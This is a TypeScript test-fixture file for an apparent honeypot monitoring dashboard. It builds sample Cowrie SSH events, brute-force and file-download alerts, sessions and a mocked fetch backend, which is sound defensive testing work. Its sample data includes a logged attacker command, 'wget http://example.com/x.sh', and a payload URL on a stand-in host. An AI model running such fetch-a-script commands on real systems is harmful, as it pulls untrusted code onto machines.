import { vi } from "vitest";

import type {
  Alert,
  AlertPage,
  CommandPage,
  CommandRecord,
  EventPage,
  EventSummary,
  NormalizedEvent,
  SessionPage,
  SessionSummary,
  SourceActivity,
  SourceDetail,
  SourcePage,
} from "../api/types";

export interface RecordedRequest {
  url: string;
}

export function makeEvent(overrides: Partial<NormalizedEvent> = {}): NormalizedEvent {
  return {
    event_id: "e-1",
    source: "cowrie",
    source_event_id: "cowrie.login.failed",
    event_type: "auth.login_failed",
    event_category: "authentication",
    occurred_at: "2026-03-01T12:00:00Z",
    received_at: "2026-03-01T12:00:01Z",
    sensor: "honeypot-1",
    session_id: "sess-1",
    source_ip: "203.0.113.10",
    source_port: 51234,
    destination_ip: "10.0.0.5",
    destination_port: 22,
    protocol: "ssh",
    username: "root",
    outcome: "failure",
    details: { input: "root", password: "123456" },
    raw: { eventid: "cowrie.login.failed", username: "root" },
    ...overrides,
  };
}

export function makePage(overrides: Partial<EventPage> = {}): EventPage {
  return {
    total: 2,
    limit: 50,
    offset: 0,
    items: [
      makeEvent(),
      makeEvent({
        event_id: "e-2",
        event_type: "command.success",
        event_category: "command",
        outcome: "success",
        occurred_at: "2026-03-01T12:05:00Z",
        details: { input: "uname -a" },
      }),
    ],
    ...overrides,
  };
}

export function makeAlert(overrides: Partial<Alert> = {}): Alert {
  return {
    id: 1,
    detection_id: 1,
    alert_type: "auth_threshold",
    severity: "high",
    rule_id: "auth_bruteforce",
    title: "Multiple authentication attempts from one IP",
    description: "17 failed logins from 203.0.113.10 in 300 seconds",
    source_ip: "203.0.113.10",
    session_id: null,
    occurred_from: "2026-03-01T11:55:00Z",
    occurred_to: "2026-03-01T12:00:00Z",
    event_count: 17,
    evidence: { threshold: 5, usernames: ["root"], event_ids: ["e-1", "e-2"] },
    generated_at: "2026-03-01T12:00:02Z",
    ...overrides,
  };
}

export function makeAlertPage(overrides: Partial<AlertPage> = {}): AlertPage {
  return {
    total: 2,
    limit: 25,
    offset: 0,
    items: [
      makeAlert(),
      makeAlert({
        id: 2,
        alert_type: "file_transfer",
        severity: "medium",
        rule_id: "file_download",
        title: "File download or transfer",
        session_id: "sess-1",
        event_count: 1,
        evidence: { url: "http://example.com/payload.sh", event_ids: ["e-3"] },
      }),
    ],
    ...overrides,
  };
}

export function makeSummary(overrides: Partial<EventSummary> = {}): EventSummary {  return {
    total_events: 120,
    unique_source_ips: 7,
    unique_sessions: 11,
    unique_usernames: 3,
    first_event_at: "2026-03-01T00:00:00Z",
    last_event_at: "2026-03-02T23:59:59Z",
    auth_attempts: 80,
    commands: 25,
    alerts: 0,
    // The breakdown counts are distinct from the counters above so a test can
    // assert on a single element per value.
    by_category: [
      { key: "authentication", count: 74 },
      { key: "command", count: 21 },
    ],
    by_outcome: [{ key: "failure", count: 68 }],
    by_protocol: [{ key: "ssh", count: 118 }],
    top_event_types: [
      { key: "auth.login_failed", count: 70 },
      { key: "command.success", count: 19 },
    ],
    ...overrides,
  };
}

export function makeSession(overrides: Partial<SessionSummary> = {}): SessionSummary {
  return {
    session_id: "sess-1",
    source_ip: "203.0.113.10",
    first_seen: "2026-03-01T11:59:00Z",
    last_seen: "2026-03-01T12:00:00Z",
    duration_ms: 60_000,
    event_count: 2,
    command_count: 0,
    usernames: ["root"],
    protocols: ["ssh"],
    has_authentication: true,
    has_success: false,
    ...overrides,
  };
}

export function makeSessionPage(overrides: Partial<SessionPage> = {}): SessionPage {
  return {
    total: 2,
    limit: 25,
    offset: 0,
    items: [
      makeSession(),
      makeSession({
        session_id: "sess-2",
        source_ip: "198.51.100.4",
        last_seen: "2026-03-01T12:05:00Z",
        duration_ms: 500,
        command_count: 1,
        usernames: ["oracle", "root"],
        has_authentication: false,
        has_success: true,
      }),
    ],
    ...overrides,
  };
}

export function makeCommand(overrides: Partial<CommandRecord> = {}): CommandRecord {
  return {
    event_id: "e-1",
    event_type: "command.input",
    occurred_at: "2026-03-01T12:01:00Z",
    source_ip: "203.0.113.10",
    session_id: "sess-1",
    username: "root",
    outcome: null,
    command: "wget",
    command_line: "wget http://example.com/x.sh",
    ...overrides,
  };
}

export function makeCommandPage(overrides: Partial<CommandPage> = {}): CommandPage {
  return {
    total: 2,
    limit: 25,
    offset: 0,
    items: [
      makeCommand(),
      makeCommand({
        event_id: "e-2",
        event_type: "command.failed",
        occurred_at: "2026-03-01T12:02:00Z",
        outcome: "failure",
        command: "totally-not-a-command",
        command_line: "totally-not-a-command --now",
      }),
    ],
    ...overrides,
  };
}

export function makeSource(overrides: Partial<SourceActivity> = {}): SourceActivity {
  return {
    source_ip: "203.0.113.10",
    event_count: 120,
    session_count: 11,
    auth_attempts: 80,
    commands: 25,
    transfers: 1,
    failures: 90,
    usernames: ["root", "admin"],
    first_seen: "2026-03-01T00:00:00Z",
    last_seen: "2026-03-01T23:59:59Z",
    ...overrides,
  };
}

export function makeSourcePage(overrides: Partial<SourcePage> = {}): SourcePage {
  return {
    total: 2,
    limit: 25,
    offset: 0,
    items: [
      makeSource(),
      makeSource({
        source_ip: "198.51.100.4",
        event_count: 3,
        session_count: 1,
        auth_attempts: 0,
        commands: 1,
        transfers: 0,
        failures: 1,
        usernames: ["oracle"],
        last_seen: "2026-03-01T12:05:00Z",
      }),
    ],
    ...overrides,
  };
}

export function makeSourceDetail(overrides: Partial<SourceDetail> = {}): SourceDetail {
  return {
    ...makeSource(),
    by_category: [
      { key: "authentication", count: 80 },
      { key: "command", count: 25 },
    ],
    ...overrides,
  };
}

/**
 * Replace `fetch` with a recording stub. `respond` maps the requested URL to
 * the JSON body the backend would answer.
 */export function mockBackend(
  respond: (url: URL) => { status?: number; body: unknown } | undefined,
): RecordedRequest[] {
  const calls: RecordedRequest[] = [];

  vi.stubGlobal("fetch", async (input: RequestInfo | URL) => {
    const raw = typeof input === "string" ? input : String(input);
    calls.push({ url: raw });
    const answer = respond(new URL(raw, "http://dashboard.test"));
    return new Response(JSON.stringify(answer?.body ?? null), {
      status: answer?.status ?? 200,
      headers: { "Content-Type": "application/json" },
    });
  });

  return calls;
}

/** The URLs of the recorded requests, without the origin. */
export function paths(calls: RecordedRequest[]): string[] {
  return calls.map((call) => call.url);
}
